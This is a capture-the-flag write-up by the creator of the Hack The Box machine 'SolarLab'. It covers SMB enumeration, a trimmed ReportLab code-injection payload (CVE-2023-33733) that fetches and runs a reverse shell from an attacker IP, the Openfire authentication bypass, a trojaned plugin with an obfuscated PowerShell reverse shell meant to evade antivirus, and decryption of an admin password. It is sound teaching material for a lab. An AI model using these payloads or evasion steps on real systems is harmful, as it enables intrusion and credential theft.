# SolarLab

## Introduction

I have found inspiration in my real-world engagements however I decided to make some steps more difficult otherwise they would've been considered unrealistic/boring for a HTB machine. Players will encounter an internal employee portal for which they will find credentials on an open SMB share. This portal allows employees to generate PDFs which turns out are created with the python library ReportLab which has a version vulnerable to RCE via code injection. After getting a foothold, they will exploit an Authentication Bypass in Openfire to create an admin account and upload a .jar plugin to get RCE as user openfire and decrypt the original administrator password from the embedded database. This is a box relying on strong enumeration, attention to detail and minor python and java knowledge.

## Writeup

### Enumeration
A quick top 1000 port scan with Nmap reveals on SMB ports and port 80:  

[![image](https://i.imgur.com/YXYoyyj.png)

On port 80 we find a static webpage mentioning some secure Instant Messenger application that's coming soon (in one year, some people have a weird definition of soon):  

![image](https://i.imgur.com/TJOtne2.png)

Even though it's a static website, we do find some potential users which we'll note down for future reference:  

![image](https://i.imgur.com/kGX3C5T.png)

Using netexec we can find that we have read access to an SMB share:  

![image](https://github.com/user-attachments/assets/88bda81a-ec99-4966-90ad-83e0c78ec567)

Listing it, we can see interesting looking file called `details-file.xlsx`.:  

![image](https://github.com/user-attachments/assets/6edd73c3-1d12-423b-9425-74b689b6486a)

The `details-file.xlsx` looks like it contains a lot of potential users and passwords which we will make a note of as well:  
![image](https://i.imgur.com/LkQFUHJ.png)

Let's expand our search and run a full Nmap scan. After we do that, we can find a port that seems to be non-standard as Nginx returns a Forbidden message:  

![image](https://i.imgur.com/5cjy2K7.png)

Now that we have another port, let's try fuzzing for subdomains as well. Some players might start with fuzzing for subdomains when they see that the IP redirects to solarlab.htb however, without also adding the hidden port, the internal portal won't be found:  

```bash
ffuf -c -t 100 -u 'http://solarlab.htb:6791' -H 'Host: FUZZ.solarlab.htb:6791' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 3
```

we have a hit on `report.solarlab.htb:6791`:  

![image](https://i.imgur.com/zmfunIu.png)

Accessing the page, we see a login portal:  

![image](https://i.imgur.com/G0SVmNF.png)

Trying some of the usernames and password combinations we found in the excel sheet, we find that we have User Enumeration on the login page and we don't have all the usernames in all of the presented formats:  

![image](https://i.imgur.com/8We5mfC.png) ![image](https://i.imgur.com/NcOrq7t.png)  
On our 3rd attempt, we find a valid user so we figured out the username format which is FirstName + LastName initial:  

![image](https://i.imgur.com/tp6cBBX.png)

Using BurpSuite `Intruder` with Cluster Bomb or any other fuzzing tools, we soon find valid credentials:  

![image](https://i.imgur.com/N4iPDSi.png)

user: blakeb  
pass: ThisCanB3typedeasily1@

After we login, we find a centralized employee portal for "secure communication' and we have options to fill out forms for Leave Request, Training Request, Home Office Request and Travel Approval:  

![image](https://i.imgur.com/DO3bBY6.png)

Let's start with filling out one of these forms. We see at the bottom we have some character limit and we can upload a signature:  

![image](https://i.imgur.com/Mp0Z0BZ.png)

I uploaded an empty red picture and we can see that it generated a PDF for us:  

![image](https://i.imgur.com/AZ8a8AT.png)

This is how a normal user would use this application. We can start experimenting with the various features and user input. We soon find that the file upload is using whitelisting:  

![image](https://i.imgur.com/wWNiGxZ.png)

HTML seems to be properly filtered and encoded:  
![image](https://i.imgur.com/kVCyOj1.png)

At least that's what it looks like from the client side. Intercepting with Burp Suite, we can see that the user input is HTML encoded, what if we change that and send a request from here directly?  

![image](https://i.imgur.com/kk4zI9h.png)

Sending a simple XSS payload allows a PDF to be generated, but it has filtered the script tags:  

![image](https://i.imgur.com/Te4hIh8.png)
![image](https://i.imgur.com/QDECVzx.png)  
This means that there is something else at work here. Let's download the PDF and see if any metadata info will help us further. We find that the Producer is ReportLab:  

![image](https://i.imgur.com/qE7t0cf.png)

Using Google to search for vulnerabilities, we find that ReportLab is a python library that has an RCE vulnerability via code injection. This must be our way in:  
![image](https://i.imgur.com/48XaVDu.png)

The POC on Snyk has an awful lot of characters:  
![image](https://i.imgur.com/q40tvt1.png)

Either from the browser, or from Burp Suite, the character limitation seems to be implemented both client side as well as server side:  

![image](https://i.imgur.com/UTIm74d.png)

Further googling allows us to find this [POC](https://github.com/c53elyas/CVE-2023-33733). This one also has too many characters but in our context, we should be able to trim it down enough to be able to test and see if they are using a vulnerable ReportLab library:  

![image](https://i.imgur.com/iwTYNG7.png)

We start by removing any redundant spaces, new lines, tabs and remove the touch command since we are dealing with a Windows OS and we first want to test the generator, not issue commands yet. I've also replaced the word exploit with just a letter. Saving every character counts. We are down to `424` characters:  

![image](https://i.imgur.com/59jH0gW.png)

> [!NOTE]  
> _At this point, as you can see, I've only looked at the `user_input` field that has the character limitation however, during the first few hours of the release, I realised I forgot to sanitize all the other fields relying only on client side validation. Obviously this was a rookie mistake but I've made the decision to leave it like this as I found it to be extraordinarily funny. The point of the vulnerability was that the attempted "patch" of character limit was not supposed to be enough as you will see further down. Having two other fields that were also vulnerable made perfect sense for the "developer" (me) to overlook it_.


### Foothold as Blake
Let's pretend that we only have the field that has the character limit. We need to shave some more dead weight. As we've read in the github POC, the `Word` is just a variable name, so we can simply replace that with `W`. Same thing with `orgTypeFun`. I replaced it with `O`. Also replaced `self` with `s`, `mutate` with `m` and `mutated` with `M` since the logic of the code would stay the same. I've also removed all spaces which are not absolutely required to still have valid Python code and we eventually reach `299` characters with the code below:  
```html
<para><font color="[[getattr(pow,W('__globals__'))['os'].system('')for W in[O('W',(str,),{'M':1,'startswith':lambda s,x:False, '__eq__':lambda s,x:s.m()and s.M<0 and str(s)==x,'m':lambda s:{setattr(s,'M',s.M-1)},'__hash__':lambda s:hash(str(s))})]]for O in [type(type(1))]]and 'red'">t</font></para>
```
Although we know for sure our input has `299` characters, it seems that Client Side, it is detecting 326 characters.  
![image](https://i.imgur.com/JhcKYzb.png)

Looking in Burp Suite, we can tell it is because of the HTML encoding we saw it is doing earlier.  
![image](https://i.imgur.com/oiPvCeE.png)

No worries, let's work from Burp then and simply put our payload to be parsed Server Side:  
![image](https://i.imgur.com/EqdBH6u.png)

Interestingly enough, we have a 500 Internal Server Error received and it looks like this is a Flask application with Debug set to True. The console is accessible but we can't read files from the server to be able to generate a pin.

![image](https://i.imgur.com/DCSdh5Q.png)

The error mentions some Index Error about the paragraph text so let's remove the `<para>` tags which will also give us more characters to work with. We are down to `286` characters without issuing any command:  

```bash
<font color="[[getattr(pow,W('__globals__'))['os'].system('')for W in[O('W',(str,),{'M':1,'startswith':lambda s,x:False, '__eq__':lambda s,x:s.m()and s.M<0 and str(s)==x,'m':lambda s:{setattr(s,'M',s.M-1)},'__hash__':lambda s:hash(str(s))})]]for O in [type(type(1))]]and 'red'">t</font>
```
We send that via Burp and a PDF is generated where we can see our letter in red which means that the code was parsed correctly, we have the code injection working:  

![image](https://i.imgur.com/WEEhRPA.png)

But we still don't have enough room to actually run any commands so let's go deeper. We can remove the closing font tag and the letter since we don't actually need to write anything into the PDF. For the same reason, we can also replace the word red with a letter. Also, another way of saying `x:False` in python is `x:0` because 0 is False. So we trimmed down more characters from there. We have finally cut off as much as we could, or at least as much as I could or even need for the next step. 

We are currently at `271` characters without issuing a command. I'm curious to see if players will find another way of getting this POC even shorter/smaller.

```bash
<font color="[[getattr(pow,W('__globals__'))['os'].system('')for W in[O('W',(str,),{'M':1,'startswith':lambda s,x:0,'__eq__':lambda s,x:s.m()and s.M<0 and str(s)==x,'m':lambda s:{setattr(s,'M',s.M-1)},'__hash__':lambda s:hash(str(s))})]]for O in[type(type(1))]]and 'r'"/>
```

We now have room to run a command to test our RCE. We issue a simple curl command. Although we get another 500 Internal Server Error, we can see that a GET request was made on our python web server:  

![image](https://i.imgur.com/U0TT5Go.png)

It's time to try getting a reverse shell. Using [revshells.com](https://www.revshells.com/) we can generate a payload for python windows version:  

![image](https://i.imgur.com/JZMkOs9.png)

We save the payload in a file called `r` (in my case), host it via the python webserver, set a netcat listener on the port we chose for the reverse shell then issue the following command via Burp Suite:

```bash
<font color="[[getattr(pow,W('__globals__'))['os'].system('curl -o r 192.168.1.141/r')for W in[O('W',(str,),{'M':1,'startswith':lambda s,x:0,'__eq__':lambda s,x:s.m()and s.M<0 and str(s)==x,'m':lambda s:{setattr(s,'M',s.M-1)},'__hash__':lambda s:hash(str(s))})]]for O in[type(type(1))]]and 'r'"/>
```
We see that the file was grabbed:  

![image](https://i.imgur.com/0ER0Z3X.png)

Another command is necesary now to simply run it with python:

```bash
<font color="[[getattr(pow,W('__globals__'))['os'].system('python r')for W in[O('W',(str,),{'M':1,'startswith':lambda s,x:0,'__eq__':lambda s,x:s.m()and s.M<0 and str(s)==x,'m':lambda s:{setattr(s,'M',s.M-1)},'__hash__':lambda s:hash(str(s))})]]for O in[type(type(1))]]and 'r'"/>
```

And we get on the box as user `blake` and get the user flag:  

![image](https://i.imgur.com/yJq0SHs.png)

### Lateral Movement to Openfire user
Running the net users commands, we can see another user called openfire:  

![image](https://i.imgur.com/i9AR98v.png)

In `Program Files` we also see an openfire folder:  

![image](https://i.imgur.com/WFmHT2b.png)

But as user blake, we are not able to enumerate it as we don't have access to it:  

![image](https://i.imgur.com/5LGXVsX.png)

After some research about openfire, we find that the console port should be on port 9090:  
![image](https://i.imgur.com/qj0KJfB.png)

Indeed, internally, we also see a lot of open ports, among them, we also find the Openfire console port open:  
![image](https://i.imgur.com/xajEbTO.png)

Doing a curl request with `-L` to follow redirects, we can enumerate the Openfire and find it's version:  
```bash
curl -L http://127.0.0.1:9090/index.jsp
```
![image](https://i.imgur.com/tGOqJwE.png)

A quick google search reveals that this version is vulnerable to an Authentication Bypass:  
![image](https://i.imgur.com/1ZvhB4u.png)

> [!NOTE]  
> _Another difference from conception to actual deployement was that initially I wanted the AV to be enabled. This would've meant that the Metasploit module and other scripts found online wouldn't work. After testing however, HTB made the decision to disable the AV making the box more inline with a Medium difficulty. At the time of originally making the box, the path below worked with the AV enabled_.

At this point, players can either choose to simply run the exploits locally since python and pip is installed, or they could try to forward the port to have it accessible from their hosts. The second option would be the more difficult one because Windows Defender is ON (let's pretend) and updated so `chisel` will be detected however there are plenty of other options. 

One such option would be to use Havoc C2 to generate a Windows Shellcode, obfuscate it using [Harriet](https://github.com/assume-breach/Home-Grown-Red-Team/tree/main/Harriet) from [Home-Grown-Read-Team](https://github.com/assume-breach/Home-Grown-Red-Team) to create an .exe payload.  
![image](https://i.imgur.com/VlEyZHu.png)

Upload and run that via the already established foothold and get a callback in Havoc. From there run the command `socks add 1080` to start a socks proxy and they will have access to Openfire via proxychains.
![image](https://i.imgur.com/OlLobEm.png)

The easier method is to use already existing public POCs that they will need to modify a little bit. A quick google search allows us to find a python script that abuses the Auth Bypass and creates an admin user for us.

One such good [POC](https://github.com/miko550/CVE-2023-32315) is the very first result on Google:  
![image](https://i.imgur.com/2t1MJ70.png)

Once we run it on the machine, we see we need to install HackRequests module, which can be installed offline using the [whl](https://files.pythonhosted.org/packages/1b/93/ce8f6b31713b50f495612244f2183d141ac7f4ea1da31082988218daf3ea/HackRequests-1.2-py3-none-any.whl) file:

```bash
pip install HackRequests-1.2-py3-none-any.whl
```
We now encounter an issue in displaying the artwork:  
![image](https://i.imgur.com/8PEruVf.png)

No worries, we just need to comment out the line `print(artwork)` and run it again successfully creating an admin user this time:  

![image](https://i.imgur.com/yehHWY9.png)

Now we need to find a way to use these credentials. Since we are still working from this reverse shell, we can use my [script](https://github.com/LazyTitan33/Openfire_Plugin_Upload) to upload a plugin for a reverse shell. Users can write their own, find mine, or forward the port. Uploading a .jar file to get a reverse shell is a well known technique going as far back as 2015 or so, there's even a metasploit module for it.

However, keep in mind that we have Windows Defender AV turned on (let's pretend). Players can enumerate that using `Get-MpComputerStatus`:  

![image](https://i.imgur.com/ZfipF3J.png)

This will prevent the metasploit module from getting a shell and will also prevent certain public webshells from working as well. At this point some java skills and out of the box thinking is required. The more experienced players could simply write a malicious .jar file from scratch, however Openfire has their own PDK (plugin development kit): https://download.igniterealtime.org/openfire/docs/latest/documentation/plugin-dev-guide.html
which makes it kinda hard to set everything up and ensure that the Openfire server will process our plugin properly.

Another way, the lazy way, is to modify an existing plugin. Being an opensource tool, the plugins are opensource as well and can be found on github. Let's take an example from a plugin that's smaller in size. This is to minimize the code we have to go through and understand. The application itself tells us the names of available plugins and their size which is very helpful.

Let's take the Broadcast plugin as an example:
https://github.com/igniterealtime/openfire-broadcast-plugin

We start by cloning this repo locally. In src/java/org/jivesoftware/openfire/plugin we can find BroadcastPlugin.java. Reading through the code, we see an interesting class called "initializePlugin". If we want our malicious plugin to do something, we definitely want it done when the plugin gets initialized so this is where we can inject some java code.

![image](https://user-images.githubusercontent.com/80063008/218333680-bae339e7-97f0-4f3a-87b3-75ed07c1d629.png)

We can add the code below with an updated Try/Catch in case of errors:
![image](https://i.imgur.com/K2fB03T.png)

The powershell command is a Base64 encoded reverse shell generated with this [powershell-obfuscator](https://github.com/deeexcee-io/PowerShell-Reverse-Shell-Generator/blob/main/PowerShell-Obfuscator.py) to bypass AV:

We also import the java IOException for the Try/Catch to work:  
![image](https://user-images.githubusercontent.com/80063008/218333768-cca7ba8a-3d91-4142-bba0-b008bd91244c.png)

Now that we trojaned a plugin, we can compile it with "mvn":
```bash
mvn clean package -DskipTests
```
After a bit, we get a successful build:  
![image](https://user-images.githubusercontent.com/80063008/218333861-3a74fbce-7149-4ecf-a90b-85458181032e.png)

Now we have some files in a new folder called target. We also have a .jar file:  
![image](https://user-images.githubusercontent.com/80063008/218333919-33c2896b-8683-4594-a410-20d200d00137.png)

Trying to upload this .jar plugin using my script errors because we don't have the requests module installed.  
![image](https://i.imgur.com/tBdXzps.png)

That's a minor issue as we can install it offline as well. On the attacker machine, we need to run:

```bash
pip wheel requests
```
This will download all the .whl files we need and then upload them all on the victim machine, and install them one be one using pip. Making sure to get the .whl files for none-any platform will be essential to be able to install them. This is a minor issue but one where attention to detail is again required, or you can run the pip wheel command from a Windows machine:  

![image](https://i.imgur.com/UyyyALJ.png)

After we run the script, the file gets uploaded and we get a reverse shell as user openfire:  

![image](https://i.imgur.com/Vk23XDk.png)

### Privilege Escalation to Administrator
> [!NOTE]  
> _Another unintended path is via password reuse because I forgot to change the password for user AlexanderK. His password hash can be found in the embedded-db and it is crackable because originally I wanted to go through password reuse, but in the meantime this neat CVE for OpenFire came out. Again, rookie mistake forgetting the password, but we've decided to keep it in and not patch it as I liked the double pathway to admin and it fit the theme of password reuse that we saw earlier with BlakeB._

Enumerating the openfire folder, we can see it is using an `embedded-db` as indicated by the presence of this folder:  

![image](https://i.imgur.com/lTK2Knc.png)

In the `openfire.script` file we see an interesting statement where it seems the admin password is set up:  

![image](https://i.imgur.com/LEL7peZ.png)

We can do some googling to find how to decrypt this Openfire password and find a helpful [github](https://github.com/shakaw/openfire-password-decrypt) page:;

![image](https://user-images.githubusercontent.com/80063008/222528445-772c676a-618e-47fd-ab99-322726193551.png)

It seems that besides the encrypted password we also require a `passwordKey`. We can use `findstr` to quickly search for it in the same file:  

![image](https://i.imgur.com/NViYdki.png)

We can add our variables to the script we found and decrypt the password:

```php
<?php
function decrypt_openfirepass($ciphertext, $key) {
    $cypher = 'blowfish';
    $mode   = 'cbc';
    $sha1_key = sha1($key, true);
    $td = mcrypt_module_open($cypher, '', $mode, '');
    $ivsize    = mcrypt_enc_get_iv_size($td);
    $iv = substr(hex2bin($ciphertext), 0, $ivsize);
    $ciphertext = substr(hex2bin($ciphertext), $ivsize);
    if ($iv) {
        mcrypt_generic_init($td, $sha1_key, $iv);
        $plaintext = mdecrypt_generic($td, $ciphertext);
    }
    return $plaintext;
}

$enc_password = 'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442';
$blowfish_key = 'hGXiFzsKaAeYLjn';
echo decrypt_openfirepass($enc_password, $blowfish_key);
```
![image](https://i.imgur.com/litIoZr.png)

```text
ThisPasswordShouldDo!@
```

From our reverse shell, we can switch to powershell and use `Invoke-Command` to run commands as the Administrator user and get the root.txt flag.

```powershell
$pass = ConvertTo-SecureString 'ThisPasswordShouldDo!@' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Administrator", $pass)
Invoke-Command -Computer localhost -ScriptBlock {whoami} -Credential $cred
```
![image](https://i.imgur.com/OeTTIgn.png)

> [!IMPORTANT]  
> _As a last note I would like to thank everyone who took the time to rate and provide feedback as it helped a lot._



